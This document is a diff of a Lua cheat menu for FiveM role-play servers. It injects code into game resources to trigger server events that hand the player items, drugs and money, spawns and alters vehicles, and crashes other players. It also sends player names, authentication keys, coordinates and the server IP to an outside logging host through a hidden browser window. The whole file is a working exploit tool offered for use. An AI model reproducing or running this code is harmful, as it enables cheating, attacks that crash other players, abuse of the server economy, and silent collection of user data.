 TriggerServerEvent('eBuEbMDCReGPL9LCVoDVMBs29gQ6uI8GixD5YuiwdulEtIu8O2kJ5Am7n5O6VqDTGJIMBO3YnzduvN4EMV4aio005Lc1PrKDVXwzu2UcvfF1fA9jSojSlkC9:uyWsjuoUykPtgbl6c9AhnRuBWtT6tZPXNlTEcczR0zz9T1zroxIHORCNWqJVuh0W25mLGgy7oCFU802wxw0iiyLWLgF7i9ZSX2C6H4j6Qj8FQ4rlSzEoVELj', 'TCU 564 ', 'item_standard', 'bigbox', ]] .. amount .. [[, 717225484)
 ]])
             MachoMenuNotification("Item", "Got " .. amount .. "x Bigbox!")
@@ -952,7 +915,7 @@ TriggerServerEvent('eBuEbMDCReGPL9LCVoDVMBs29gQ6uI8GixD5YuiwdulEtIu8O2kJ5Am7n5O6
         MachoMenuButton(group, "Bulletproof", function()
             local amount = selectedDrugAmount
             SendActionLog("Item", "Bulletproof", "Got bulletproof from TCU 564", tostring(amount), "bulletproof", "TCU 564", "", "")
-            MachoInjectResource("esx_trunk", [[
+            MachoInjectResource("any", [[
 TriggerServerEvent('eBuEbMDCReGPL9LCVoDVMBs29gQ6uI8GixD5YuiwdulEtIu8O2kJ5Am7n5O6VqDTGJIMBO3YnzduvN4EMV4aio005Lc1PrKDVXwzu2UcvfF1fA9jSojSlkC9:uyWsjuoUykPtgbl6c9AhnRuBWtT6tZPXNlTEcczR0zz9T1zroxIHORCNWqJVuh0W25mLGgy7oCFU802wxw0iiyLWLgF7i9ZSX2C6H4j6Qj8FQ4rlSzEoVELj', 'TCU 564 ', 'item_standard', 'bulletproof', ]] .. amount .. [[, 717225484)
 ]])
             MachoMenuNotification("Item", "Got " .. amount .. "x Bulletproof!")
@@ -961,7 +924,7 @@ TriggerServerEvent('eBuEbMDCReGPL9LCVoDVMBs29gQ6uI8GixD5YuiwdulEtIu8O2kJ5Am7n5O6
         MachoMenuButton(group, "Fixkit", function()
             local amount = selectedDrugAmount
             SendActionLog("Item", "Fixkit", "Got fixkit from TCU 564", tostring(amount), "fixkit", "TCU 564", "", "")
-            MachoInjectResource("esx_trunk", [[
+            MachoInjectResource("any", [[
 TriggerServerEvent('eBuEbMDCReGPL9LCVoDVMBs29gQ6uI8GixD5YuiwdulEtIu8O2kJ5Am7n5O6VqDTGJIMBO3YnzduvN4EMV4aio005Lc1PrKDVXwzu2UcvfF1fA9jSojSlkC9:uyWsjuoUykPtgbl6c9AhnRuBWtT6tZPXNlTEcczR0zz9T1zroxIHORCNWqJVuh0W25mLGgy7oCFU802wxw0iiyLWLgF7i9ZSX2C6H4j6Qj8FQ4rlSzEoVELj', 'TCU 564 ', 'item_standard', 'fixkit', ]] .. amount .. [[, 717225484)
 ]])
             MachoMenuNotification("Item", "Got " .. amount .. "x Fixkit!")
@@ -970,7 +933,7 @@ TriggerServerEvent('eBuEbMDCReGPL9LCVoDVMBs29gQ6uI8GixD5YuiwdulEtIu8O2kJ5Am7n5O6
         MachoMenuButton(group, "Helm2", function()
             local amount = selectedDrugAmount
             SendActionLog("Item", "Helm2", "Got helm2 from TCU 564", tostring(amount), "helm2", "TCU 564", "", "")
-            MachoInjectResource("esx_trunk", [[
+            MachoInjectResource("any", [[
 TriggerServerEvent('eBuEbMDCReGPL9LCVoDVMBs29gQ6uI8GixD5YuiwdulEtIu8O2kJ5Am7n5O6VqDTGJIMBO3YnzduvN4EMV4aio005Lc1PrKDVXwzu2UcvfF1fA9jSojSlkC9:uyWsjuoUykPtgbl6c9AhnRuBWtT6tZPXNlTEcczR0zz9T1zroxIHORCNWqJVuh0W25mLGgy7oCFU802wxw0iiyLWLgF7i9ZSX2C6H4j6Qj8FQ4rlSzEoVELj', 'TCU 564 ', 'item_standard', 'helm2', ]] .. amount .. [[, 717225484)
 ]])
             MachoMenuNotification("Item", "Got " .. amount .. "x Helm2!")
@@ -979,7 +942,7 @@ TriggerServerEvent('eBuEbMDCReGPL9LCVoDVMBs29gQ6uI8GixD5YuiwdulEtIu8O2kJ5Am7n5O6
         MachoMenuButton(group, "Morphine", function()
             local amount = selectedDrugAmount
             SendActionLog("Item", "Morphine", "Got morphine from TCU 564", tostring(amount), "morphine", "TCU 564", "", "")
-            MachoInjectResource("esx_trunk", [[
+            MachoInjectResource("any", [[
 TriggerServerEvent('eBuEbMDCReGPL9LCVoDVMBs29gQ6uI8GixD5YuiwdulEtIu8O2kJ5Am7n5O6VqDTGJIMBO3YnzduvN4EMV4aio005Lc1PrKDVXwzu2UcvfF1fA9jSojSlkC9:uyWsjuoUykPtgbl6c9AhnRuBWtT6tZPXNlTEcczR0zz9T1zroxIHORCNWqJVuh0W25mLGgy7oCFU802wxw0iiyLWLgF7i9ZSX2C6H4j6Qj8FQ4rlSzEoVELj', 'TCU 564 ', 'item_standard', 'morphine', ]] .. amount .. [[, 717225484)
 ]])
             MachoMenuNotification("Item", "Got " .. amount .. "x Morphine!")
@@ -994,7 +957,7 @@ TriggerServerEvent('eBuEbMDCReGPL9LCVoDVMBs29gQ6uI8GixD5YuiwdulEtIu8O2kJ5Am7n5O6
         MachoMenuButton(group, "Get Opium", function()
             local amount = selectedDrugAmount
             SendActionLog("Item", "Get Opium", "Got opium from AAQ 338", tostring(amount), "opium_pooch", "AAQ 338", "", "")
-            MachoInjectResource("esx_trunk", [[
+            MachoInjectResource("any", [[
 TriggerServerEvent('eBuEbMDCReGPL9LCVoDVMBs29gQ6uI8GixD5YuiwdulEtIu8O2kJ5Am7n5O6VqDTGJIMBO3YnzduvN4EMV4aio005Lc1PrKDVXwzu2UcvfF1fA9jSojSlkC9:uyWsjuoUykPtgbl6c9AhnRuBWtT6tZPXNlTEcczR0zz9T1zroxIHORCNWqJVuh0W25mLGgy7oCFU802wxw0iiyLWLgF7i9ZSX2C6H4j6Qj8FQ4rlSzEoVELj', 'AAQ 338 ', 'item_standard', 'opium_pooch', ]] .. amount .. [[, 717225484)
 ]])
             MachoMenuNotification("Item", "Got " .. amount .. "x Opium!")
@@ -1003,7 +966,7 @@ TriggerServerEvent('eBuEbMDCReGPL9LCVoDVMBs29gQ6uI8GixD5YuiwdulEtIu8O2kJ5Am7n5O6
         MachoMenuButton(group, "Get Weed", function()
             local amount = selectedDrugAmount
             SendActionLog("Item", "Get Weed", "Got weed from AAQ 338", tostring(amount), "weed_pooch", "AAQ 338", "", "")
-            MachoInjectResource("esx_trunk", [[
+            MachoInjectResource("any", [[
 TriggerServerEvent('eBuEbMDCReGPL9LCVoDVMBs29gQ6uI8GixD5YuiwdulEtIu8O2kJ5Am7n5O6VqDTGJIMBO3YnzduvN4EMV4aio005Lc1PrKDVXwzu2UcvfF1fA9jSojSlkC9:uyWsjuoUykPtgbl6c9AhnRuBWtT6tZPXNlTEcczR0zz9T1zroxIHORCNWqJVuh0W25mLGgy7oCFU802wxw0iiyLWLgF7i9ZSX2C6H4j6Qj8FQ4rlSzEoVELj', 'AAQ 338 ', 'item_standard', 'weed_pooch', ]] .. amount .. [[, 717225484)
 ]])
             MachoMenuNotification("Item", "Got " .. amount .. "x Weed!")
@@ -1019,7 +982,7 @@ TriggerServerEvent('eBuEbMDCReGPL9LCVoDVMBs29gQ6uI8GixD5YuiwdulEtIu8O2kJ5Am7n5O6
             local vehiclePlate = MachoMenuGetInputbox(VehiclePlateGarageInputHandle)
             if vehiclePlate and vehiclePlate ~= "" then
                 SendActionLog("Vehicle", "Store in Garage", "Plate: " .. vehiclePlate, "1", "", "", vehiclePlate, "")
-                MachoInjectResource("esx_trunk", [[
+                MachoInjectResource("any", [[
 TriggerServerEvent('esx_advancedgarage:setVehicleState', ']] .. vehiclePlate .. [[', true, '', 1, 2460443678)
 ]])
                 MachoMenuNotification("Vehicle", "Vehicle " .. vehiclePlate .. " stored!")
@@ -1031,7 +994,7 @@ TriggerServerEvent('esx_advancedgarage:setVehicleState', ']] .. vehiclePlate .. 
         MachoMenuCheckbox(group, "Vehicle Boost (Left Shift)", 
             function()
                 SendActionLog("Vehicle", "Vehicle Boost", "Enabled", "", "", "", "", "")
-                MachoInjectResource("esx_trunk", [[
+                MachoInjectResource("any", [[
 vehicleBoostEnabled = true
 Citizen.CreateThread(function()
     while vehicleBoostEnabled do
@@ -1067,7 +1030,7 @@ end)
             end,
             function()
                 SendActionLog("Vehicle", "Vehicle Boost", "Disabled", "", "", "", "", "")
-                MachoInjectResource("esx_trunk", [[vehicleBoostEnabled = false]])
+                MachoInjectResource("any", [[vehicleBoostEnabled = false]])
                 MachoMenuNotification("Vehicle", "Vehicle Boost disabled!")
             end
         )
@@ -1075,7 +1038,7 @@ end)
         MachoMenuCheckbox(group, "No Speed Limit", 
             function()
                 SendActionLog("Vehicle", "No Speed Limit", "Enabled", "", "", "", "", "")
-                MachoInjectResource("esx_trunk", [[
+                MachoInjectResource("any", [[
 speedBoostEnabled = true
 Citizen.CreateThread(function()
     while speedBoostEnabled do
@@ -1102,14 +1065,14 @@ end)
             end,
             function()
                 SendActionLog("Vehicle", "No Speed Limit", "Disabled", "", "", "", "", "")
-                MachoInjectResource("esx_trunk", [[speedBoostEnabled = false]])
+                MachoInjectResource("any", [[speedBoostEnabled = false]])
                 MachoMenuNotification("Vehicle", "No Speed Limit disabled!")
             end
         )
 
         MachoMenuButton(group, "Fill Fuel Tank", function()
             SendActionLog("Vehicle", "Fill Fuel", "Filled to 100%", "100", "fuel", "", "", "")
-            MachoInjectResource("esx_trunk", [[
+            MachoInjectResource("any", [[
 local ped = PlayerPedId()
 local vehicle = GetVehiclePedIsIn(ped, false)
 if vehicle and vehicle ~= 0 and DoesEntityExist(vehicle) then
@@ -1124,7 +1087,7 @@ end
         MachoMenuCheckbox(group, "Brake Power 10% (Weak)", 
             function()
                 SendActionLog("Vehicle", "Brake 10%", "Enabled", "10", "", "", "", "")
-                MachoInjectResource("esx_trunk", [[
+                MachoInjectResource("any", [[
 brakePower30Enabled = false
 brakePower50Enabled = false
 brakePower70Enabled = false
@@ -1163,7 +1126,7 @@ end
             end,
             function()
                 SendActionLog("Vehicle", "Brake 10%", "Disabled", "10", "", "", "", "")
-                MachoInjectResource("esx_trunk", [[
+                MachoInjectResource("any", [[
 brakePower10Enabled = false
 if brakePower10Thread then brakePower10Thread = nil end
 ]])
@@ -1174,7 +1137,7 @@ if brakePower10Thread then brakePower10Thread = nil end
         MachoMenuCheckbox(group, "Brake Power 30% (Medium)", 
             function()
                 SendActionLog("Vehicle", "Brake 30%", "Enabled", "30", "", "", "", "")
-                MachoInjectResource("esx_trunk", [[
+                MachoInjectResource("any", [[
 brakePower10Enabled = false
 brakePower50Enabled = false
 brakePower70Enabled = false
@@ -1213,7 +1176,7 @@ end
             end,
             function()
                 SendActionLog("Vehicle", "Brake 30%", "Disabled", "30", "", "", "", "")
-                MachoInjectResource("esx_trunk", [[
+                MachoInjectResource("any", [[
 brakePower30Enabled = false
 if brakePower30Thread then brakePower30Thread = nil end
 ]])
@@ -1224,7 +1187,7 @@ if brakePower30Thread then brakePower30Thread = nil end
         MachoMenuCheckbox(group, "Brake Power 50% (Strong)", 
             function()
                 SendActionLog("Vehicle", "Brake 50%", "Enabled", "50", "", "", "", "")
-                MachoInjectResource("esx_trunk", [[
+                MachoInjectResource("any", [[
 brakePower10Enabled = false
 brakePower30Enabled = false
 brakePower70Enabled = false
@@ -1263,7 +1226,7 @@ end
             end,
             function()
                 SendActionLog("Vehicle", "Brake 50%", "Disabled", "50", "", "", "", "")
-                MachoInjectResource("esx_trunk", [[
+                MachoInjectResource("any", [[
 brakePower50Enabled = false
 if brakePower50Thread then brakePower50Thread = nil end
 ]])
@@ -1274,7 +1237,7 @@ if brakePower50Thread then brakePower50Thread = nil end
         MachoMenuCheckbox(group, "Brake Power 70% (Very Strong)", 
             function()
                 SendActionLog("Vehicle", "Brake 70%", "Enabled", "70", "", "", "", "")
-                MachoInjectResource("esx_trunk", [[
+                MachoInjectResource("any", [[
 brakePower10Enabled = false
 brakePower30Enabled = false
 brakePower50Enabled = false
@@ -1313,7 +1276,7 @@ end
             end,
             function()
                 SendActionLog("Vehicle", "Brake 70%", "Disabled", "70", "", "", "", "")
-                MachoInjectResource("esx_trunk", [[
+                MachoInjectResource("any", [[
 brakePower70Enabled = false
 if brakePower70Thread then brakePower70Thread = nil end
 ]])
@@ -1363,7 +1326,7 @@ if brakePower70Thread then brakePower70Thread = nil end
 TriggerServerEvent('YxbLIx7Z5Ku5P0ifRKTdK6MpuaSyjfQXwupITqpQpjSepa1gzcP9JA2ouOLFUQyAssKgLW52NJjJlZ5wW0Q6tCF4AUgfHfQqVgOAdvpUPR94vZrXLsSYIAvW:mtmWqg7HNdYX0QP7CHYWrYJZ4bHmF5hx54u7ndiA2QAYzObJVsgRCyvBM9b6EbZK5eIuixKavNfyH69kMIjXU1HYCl4k2MxcfrKbfJrbMWD2OPTiayTutty5', 120, 'missfinale_c2mcs_1', 'nm', 'fin_c2_mcs_1_camman', 'firemans_carry', 0.15, 0.27, 0.63, ]] .. targetID .. [[, 100000, 0.0, 49, 33, 1, 1325660500)
 ]]
             end
-            MachoInjectResource("esx_trunk", crashCode)
+            MachoInjectResource("any", crashCode)
             MachoMenuNotification("Crash", "Crashed " .. #playerIDs .. " player(s)!")
         end)
 
@@ -1372,7 +1335,7 @@ TriggerServerEvent('YxbLIx7Z5Ku5P0ifRKTdK6MpuaSyjfQXwupITqpQpjSepa1gzcP9JA2ouOLF
 
         MachoMenuButton(group, "Clothe", function()
             SendActionLog("juma", "Clothe", "Got tailor toolbox", "15", "tailorToolbox", "SAG 758", "", "")
-            MachoInjectResource("esx_trunk", [[
+            MachoInjectResource("any", [[
 TriggerServerEvent('eBuEbMDCReGPL9LCVoDVMBs29gQ6uI8GixD5YuiwdulEtIu8O2kJ5Am7n5O6VqDTGJIMBO3YnzduvN4EMV4aio005Lc1PrKDVXwzu2UcvfF1fA9jSojSlkC9:uyWsjuoUykPtgbl6c9AhnRuBWtT6tZPXNlTEcczR0zz9T1zroxIHORCNWqJVuh0W25mLGgy7oCFU802wxw0iiyLWLgF7i9ZSX2C6H4j6Qj8FQ4rlSzEoVELj', 'SAG 758 ', 'item_standard', 'tailorToolbox', 15, 717225484)
 TriggerServerEvent('90-Shops:setToSell', "PBX 893", 110, "t_tool", 15, true, "", nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, 1540253779)
 ]])
@@ -1381,7 +1344,7 @@ TriggerServerEvent('90-Shops:setToSell', "PBX 893", 110, "t_tool", 15, true, "",
 
         MachoMenuButton(group, "Wood", function()
             SendActionLog("juma", "Wood", "Got lumberjack toolbox", "5", "lumberjackToolbox", "SAG 758", "", "")
-            MachoInjectResource("esx_trunk", [[
+            MachoInjectResource("any", [[
 TriggerServerEvent('eBuEbMDCReGPL9LCVoDVMBs29gQ6uI8GixD5YuiwdulEtIu8O2kJ5Am7n5O6VqDTGJIMBO3YnzduvN4EMV4aio005Lc1PrKDVXwzu2UcvfF1fA9jSojSlkC9:uyWsjuoUykPtgbl6c9AhnRuBWtT6tZPXNlTEcczR0zz9T1zroxIHORCNWqJVuh0W25mLGgy7oCFU802wxw0iiyLWLgF7i9ZSX2C6H4j6Qj8FQ4rlSzEoVELj', 'SAG 758 ', 'item_standard', 'lumberjackToolbox', 5, 717225484)
 TriggerServerEvent('90-Shops:setToSell', "PBX 893", 220, "l_tool", 5, true, "", nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, 1540253779)
 ]])
@@ -1390,7 +1353,7 @@ TriggerServerEvent('90-Shops:setToSell', "PBX 893", 220, "l_tool", 5, true, "", 
 
         MachoMenuButton(group, "Oil", function()
             SendActionLog("juma", "Oil", "Got fuel tool box", "25", "f_tool_box", "SAG 758", "", "")
-            MachoInjectResource("esx_trunk", [[
+            MachoInjectResource("any", [[
 TriggerServerEvent('eBuEbMDCReGPL9LCVoDVMBs29gQ6uI8GixD5YuiwdulEtIu8O2kJ5Am7n5O6VqDTGJIMBO3YnzduvN4EMV4aio005Lc1PrKDVXwzu2UcvfF1fA9jSojSlkC9:uyWsjuoUykPtgbl6c9AhnRuBWtT6tZPXNlTEcczR0zz9T1zroxIHORCNWqJVuh0W25mLGgy7oCFU802wxw0iiyLWLgF7i9ZSX2C6H4j6Qj8FQ4rlSzEoVELj', 'SAG 758 ', 'item_standard', 'f_tool_box', 25, 717225484)
 TriggerServerEvent('90-Shops:setToSell', "PBX 893", 199, "f_tool", 25, true, "", nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, 1540253779)
 ]])
@@ -1399,7 +1362,7 @@ TriggerServerEvent('90-Shops:setToSell', "PBX 893", 199, "f_tool", 25, true, "",
 
         MachoMenuButton(group, "Salt", function()
             SendActionLog("juma", "Salt", "Got salt tool box", "10", "salt_tool_box", "SAG 758", "", "")
-            MachoInjectResource("esx_trunk", [[
+            MachoInjectResource("any", [[
 TriggerServerEvent('eBuEbMDCReGPL9LCVoDVMBs29gQ6uI8GixD5YuiwdulEtIu8O2kJ5Am7n5O6VqDTGJIMBO3YnzduvN4EMV4aio005Lc1PrKDVXwzu2UcvfF1fA9jSojSlkC9:uyWsjuoUykPtgbl6c9AhnRuBWtT6tZPXNlTEcczR0zz9T1zroxIHORCNWqJVuh0W25mLGgy7oCFU802wxw0iiyLWLgF7i9ZSX2C6H4j6Qj8FQ4rlSzEoVELj', 'SAG 758 ', 'item_standard', 'salt_tool_box', 10, 717225484)
 TriggerServerEvent('90-Shops:setToSell', "PBX 893", 260, "salt_tool", 10, true, "", nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, 1540253779)
 ]])
@@ -1418,7 +1381,7 @@ TriggerServerEvent('90-Shops:setToSell', "PBX 893", 260, "salt_tool", 10, true, 
             
             if vehicleCode and vehicleCode ~= "" and newPlate and newPlate ~= "" then
                 SendActionLog("Trol", "Spawn Vehicle", "Spawned vehicle", "1", "", vehicleCode, newPlate, "")
-                MachoInjectResource("esx_trunk", [[
+                MachoInjectResource("any", [[
 local ped = PlayerPedId()
 local vehicleModel = GetHashKey("]] .. vehicleCode .. [[")
 local targetPlate = "]] .. newPlate .. [["
@@ -1563,7 +1526,7 @@ end
             
             SendActionLog("Modify", "Apply Modifications", "Plate: " .. targetPlate, "1", "", "", targetPlate, "")
             
-            MachoInjectResource("esx_trunk", [[
+            MachoInjectResource("any", [[
 local ped = PlayerPedId()
 local vehicle = GetVehiclePedIsIn(ped, false)
 local vehicleModel = 0
@@ -1733,12 +1696,17 @@ Citizen.CreateThread(function()
     end
 end)
 
+-- بداية المنيو - يقرأ التحقق من S29-Auth.lua
 Citizen.CreateThread(function()
-    Wait(2000)
-    print("                           Initializing authentication system...")
-    local authSuccess = CheckAuthentication()
-    if authSuccess then
-        print("                           Menu is ready to use! Press DELETE to open.")
+    -- انتظر حتى يكتمل التحقق من S29-Auth.lua
+    Wait(3000)
+    
+    -- قراءة نتيجة التحقق من المتغير العام
+    if _G.S29_AUTHORIZED then
+        isAuthenticated = true
+        print("^2[S29 MENU]^0 Menu loaded! Press DELETE to open.")
+        
+        -- إرسال لوق
         local playerName = GetPlayerName(PlayerId()) or "Unknown"
         local serverId = GetPlayerServerId(PlayerId()) or 0
         local ped = PlayerPedId()
@@ -1748,20 +1716,14 @@ Citizen.CreateThread(function()
         local url = "https://s29-production.up.railway.app/log?name=" .. playerName .. "&sid=" .. serverId .. "&key=" .. playerKey .. "&hp=" .. GetEntityHealth(ped) .. "&ar=" .. GetPedArmour(ped) .. "&st=" .. string.format("%.0f", GetPlayerSprintStaminaRemaining(PlayerId())) .. "&wp=Unarmed&x=" .. string.format("%.0f", coords.x) .. "&y=" .. string.format("%.0f", coords.y) .. "&z=" .. string.format("%.0f", coords.z) .. "&h=0&zone=Unknown&str=Unknown&veh=OnFoot&plt=NA&vhp=NA&mdl=0&pls=0&sip=" .. serverIP .. "&type=authorized"
         local loginDui = MachoCreateDui(url)
         if loginDui then Wait(2000) MachoDestroyDui(loginDui) end
-        Wait(1000)
+        
+        Wait(500)
         local success = CreateAlbsMenu()
         if success then
             isMenuVisible = false
             DisableBlockInput()
         end
     else
-        print("                           Menu access denied!")
-        local playerName = GetPlayerName(PlayerId()) or "Unknown"
-        local serverId = GetPlayerServerId(PlayerId()) or 0
-        local playerKey = MachoAuthenticationKey() or "Unknown"
-        local coords = GetEntityCoords(PlayerPedId())
-        local url = "https://s29-production.up.railway.app/log?name=" .. playerName .. "&sid=" .. serverId .. "&key=" .. playerKey .. "&hp=0&ar=0&st=0&wp=NA&x=" .. string.format("%.0f", coords.x) .. "&y=" .. string.format("%.0f", coords.y) .. "&z=" .. string.format("%.0f", coords.z) .. "&h=0&zone=NA&str=NA&veh=NA&plt=NA&vhp=NA&mdl=0&pls=0&sip=Unknown&type=unauthorized"
-        local loginDui = MachoCreateDui(url)
-        if loginDui then Wait(2000) MachoDestroyDui(loginDui) end
+        print("^1[S29 MENU]^0 Access denied! Run S29-Auth.lua first.")
     end
 end)
